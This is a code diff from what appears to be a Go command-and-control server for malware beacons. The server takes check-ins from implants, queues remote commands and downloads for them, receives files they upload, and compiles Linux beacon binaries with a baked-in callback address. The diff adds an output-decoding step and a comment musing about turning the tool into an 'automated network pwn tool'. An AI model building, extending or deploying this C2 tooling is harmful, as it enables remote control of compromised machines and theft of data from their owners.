@@ -44,6 +44,14 @@ var cmdArgs = map[string]string {
 	"use": "<beacon id OR index>",
 }
 
+/*
+
+
+potentially turn into automated network pwn tool?
+
+
+*/
+
 func receiveFile(beacon *Beacon, w http.ResponseWriter, r *http.Request) {
     r.ParseMultipartForm(32 << 20)
     var buf bytes.Buffer
@@ -98,10 +106,10 @@ func beaconGetHandler(w http.ResponseWriter, r *http.Request) {
 	data := mux.Vars(r)["data"]
 	respMap := make(map[string][]string)
 	decoded, _ := b64.StdEncoding.DecodeString(data)
-	
 	json.Unmarshal(decoded, &update)
 	beacon := registerBeacon(update)
-	
+	decodedData, _ := b64.StdEncoding.DecodeString(update.Data)
+
 	respMap["exec"] = beacon.ExecBuffer
 	respMap["download"] = beacon.DownloadBuffer
 
@@ -110,7 +118,7 @@ func beaconGetHandler(w http.ResponseWriter, r *http.Request) {
 	beacon.DownloadBuffer = nil
 
 	if len(update.Data) > 0 {
-		out := strings.Replace(update.Data, "\n", "\n\t", -1)
+		out := strings.Replace(string(decodedData), "\n", "\n\t", -1)
 		fmt.Println("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
 		fmt.Println("\t" + out[:len(out)-1])
 		prompt()
@@ -175,7 +183,7 @@ func listBeacons() {
 
 func createBeacon(lhost string, lport string) {
 	exec.Command("/bin/sh", "-c", "rm out/*").Output()
-	exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.cmdAddress=" + lhost + " -X main.cmdPort=" + lport + " -X main.cmdHost=command.com' -o out/beacon beacon/beacon.go").Output()
+	exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.cmdAddress=" + lhost + " -X main.cmdPort=" + lport + " -X main.cmdHost=command.com' -o out/beacon beacon/*.go").Output()
 	fmt.Println("Created beacon in out directory.")
 }
 
